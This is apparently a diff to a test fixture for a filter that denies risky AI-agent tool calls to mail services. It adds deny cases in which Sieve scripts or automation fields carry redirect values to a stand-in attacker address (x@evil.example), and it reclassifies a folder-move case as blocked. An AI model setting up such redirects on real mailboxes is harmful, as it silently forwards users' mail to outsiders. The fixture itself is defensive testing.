@@ -1593,6 +1593,49 @@
       ],
       "deny": [
         {
+          "tool": "mcp__outlook__move_message",
+          "input": {
+            "messageId": "x",
+            "destination": "Forwarded"
+          },
+          "note": "BE r2 B4: destination / target / targetFolder are not globally inert; on a non-plain tool a forward word there denies (fail-closed, accepted over-block for move_message)"
+        },
+        {
+          "tool": "mcp__sieve__put_script",
+          "input": {
+            "target": "redirect :copy \"x@evil.example\";"
+          },
+          "note": "BE r2 B4: a script or redirect value on a destination / target key of a non-plain tool denies (regression of the global exemption, closed)"
+        },
+        {
+          "tool": "mcp__fastmail__upload_script",
+          "input": {
+            "destination": "redirect \"x@evil.example\";"
+          },
+          "note": "BE r2 B4: a script or redirect value on a destination / target key of a non-plain tool denies (regression of the global exemption, closed)"
+        },
+        {
+          "tool": "mcp__protonmail__update_sieve_script",
+          "input": {
+            "target": "redirect :copy \"x@evil.example\";"
+          },
+          "note": "BE r2 B4: a script or redirect value on a destination / target key of a non-plain tool denies (regression of the global exemption, closed)"
+        },
+        {
+          "tool": "mcp__mail__update_mailbox_settings",
+          "input": {
+            "target": "redirect"
+          },
+          "note": "BE r2 B4: a script or redirect value on a destination / target key of a non-plain tool denies (regression of the global exemption, closed)"
+        },
+        {
+          "tool": "mcp__mail__create_automation",
+          "input": {
+            "destination": "redirect:x@evil.example"
+          },
+          "note": "BE r2 B4: a script or redirect value on a destination / target key of a non-plain tool denies (regression of the global exemption, closed)"
+        },
+        {
           "tool": "mcp__gmail__create_label",
           "input": {
             "name": "x",
@@ -1970,15 +2013,6 @@
           },
           "expected": "draft",
           "note": "T5 N4-B4: attachment name fwd_invoice.pdf (prose key)"
-        },
-        {
-          "tool": "mcp__outlook__move_message",
-          "input": {
-            "messageId": "x",
-            "destination": "Forwarded"
-          },
-          "expected": null,
-          "note": "R1 C6: a folder target (destination) is a place, not a forward"
         }
       ]
     }
